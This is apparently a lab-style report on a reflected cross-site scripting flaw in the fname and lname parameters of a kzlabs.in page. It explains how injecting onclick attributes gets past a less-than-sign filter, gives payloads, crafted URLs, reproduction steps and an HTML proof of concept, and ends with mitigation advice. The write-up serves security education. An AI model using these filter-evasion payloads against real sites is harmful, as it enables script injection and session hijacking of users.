# Reflected Cross-Site Scripting (XSS) - Less-Than Sign Filter Evasion

## Summary

I identified a Reflected Cross-Site Scripting (XSS) vulnerability in the `fname` and `lname` parameters of the application.

The application filters or blocks the less-than sign (`<`), preventing traditional HTML tag injection attacks. However, this protection can be bypassed by injecting event handler attributes directly into existing HTML tags without using `<` or `>` characters. By injecting `onclick` handlers into input fields, arbitrary JavaScript execution is achieved when a user clicks on the injected element.

An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim clicks on the input field or submits the form, the injected JavaScript executes in the context of the vulnerable application, triggering an `alert(1)` popup.

## Vulnerability Type

**Cross-Site Scripting (XSS) - Reflected**

## Vulnerable Parameters

```text
fname
lname
```

## Vulnerable URL

```text
https://kzlabs.in/5.php?fname=%20onclick="alert(1)%20"&lname=%20onclick="alert(1)%20"
```

## Steps to Reproduce

1. Open the vulnerable page.

2. Replace the values of the `fname` and `lname` parameters with the following payloads:

   ```text
   fname= onclick="alert(1) "
   lname= onclick="alert(1) "
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/5.php?fname=%20onclick%3D"alert(1)%20"&lname=%20onclick%3D"alert(1)%20"
   ```

4. Observe that the payload is injected into the input fields as attribute values.

5. Click on either of the input fields or submit the form to trigger the `onclick` event.

6. The browser executes the JavaScript and displays an `alert(1)` popup.

## Payloads Used

```text
fname:  onclick="alert(1) "
lname:  onclick="alert(1) "
```

URL-encoded versions:
```text
fname: %20onclick%3D"alert(1)%20"
lname: %20onclick%3D"alert(1)%20"
```

Alternative payloads:
```text
" onclick="alert(1)"
" onclick=alert(1)
```

## Proof of Concept

The application attempts to filter the less-than sign (`<`), which prevents injection of new HTML tags. However, the application fails to sanitize attribute values, allowing injection of event handlers into existing HTML elements.

The payload works by:
1. Breaking out of the `value` attribute context using a space or quote character
2. Injecting an `onclick` event handler directly into the existing `<input>` tag
3. The `onclick` event executes when the user clicks on the input field
4. This executes the JavaScript `alert(1)`

```html
<!-- Original HTML structure: -->
<input type="text" name="fname" value="[USER INPUT]">

<!-- After injection with payload: -->
<input type="text" name="fname" value="" onclick="alert(1) "">
```

The space before `onclick` ensures the attribute is properly parsed as a separate attribute from the `value` attribute. The closing quote after the alert payload closes the `onclick` attribute value.

This technique successfully bypasses less-than sign filtering by injecting directly into existing HTML elements.

<img width="1915" height="926" alt="Screenshot 2026-08-14 183127" src="https://github.com/user-attachments/assets/755b6a2b-c54d-4fe5-a19f-938b234b5b0f" />


<img width="1919" height="885" alt="Screenshot 2026-08-14 183112" src="https://github.com/user-attachments/assets/d5b8955d-4805-4481-b174-0f6dcdf1d10c" />


## Impact

An attacker can craft a malicious link that, when opened by a victim, injects event handlers into input fields. This could allow an attacker to:

- Execute arbitrary JavaScript when users interact with the page
- Steal session cookies and hijack user accounts
- Perform actions on behalf of the authenticated user
- Capture keystrokes or sensitive information entered by the user
- Redirect users to malicious websites

## Recommendation

To mitigate this vulnerability:

- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML attributes to convert special characters to their HTML entities.
  ```php
  echo htmlspecialchars($_GET['fname'], ENT_QUOTES, 'UTF-8');
  ```

- **Attribute Context Awareness**: When placing user input in HTML attributes, ensure proper escaping for the specific attribute context. Use `htmlspecialchars()` with `ENT_QUOTES` flag.

- **Input Validation**: Validate and sanitize all user inputs. Consider using a whitelist approach to allow only safe characters.

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts and event handlers using `unsafe-inline` and `unsafe-eval` directives.

- **Event Handler Filtering**: Filter or block dangerous event handler attributes like `onclick`, `onerror`, `onmouseover`, etc.

- **Web Application Firewall (WAF)**: Deploy a WAF, such as Cloudflare WAF, to help detect and block malicious XSS payloads.

- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

- **HTML Sanitization**: Use a robust HTML sanitization library (like DOMPurify or HTML Purifier) to strip dangerous tags and attributes.

---
